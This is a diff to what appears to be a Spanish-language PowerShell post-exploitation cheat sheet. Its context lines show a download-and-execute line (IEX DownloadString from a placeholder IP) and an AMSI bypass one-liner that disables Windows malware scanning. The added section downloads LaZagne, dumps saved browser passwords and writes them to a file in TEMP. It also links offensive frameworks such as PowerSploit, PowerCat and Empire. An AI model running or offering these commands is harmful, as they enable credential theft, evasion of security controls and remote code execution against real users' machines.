@@ -96,7 +96,7 @@ IEX (New-Object Net.WebClient).DownloadString("http://<IP>/script.ps1")
 
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-AVANZADO
+# AVANZADO
 
 🔐 Credenciales en memoria
 
@@ -222,3 +222,23 @@ Nishang: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 PowerCat: https://github.com/besimorhino/powercat
 
 Empire (PS Agent): https://github.com/BC-SECURITY/Empire
+
+
+# CREDENCIALES CON LZAGNE
+
+```powershell
+Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$env:TEMP\lazagne.exe"
+
+$lazagnePath = "$env:TEMP\lazagne.exe"
+
+# Ejecutar módulo 'browsers' para sacar todas las credenciales de navegadores
+$result = & $lazagnePath browsers
+
+# Mostrar resultado en consola
+Write-Output $result
+
+# Guardar resultado en archivo
+$result | Out-File -FilePath "$env:TEMP\browser_passwords.txt" -Encoding utf8
+
+
+```
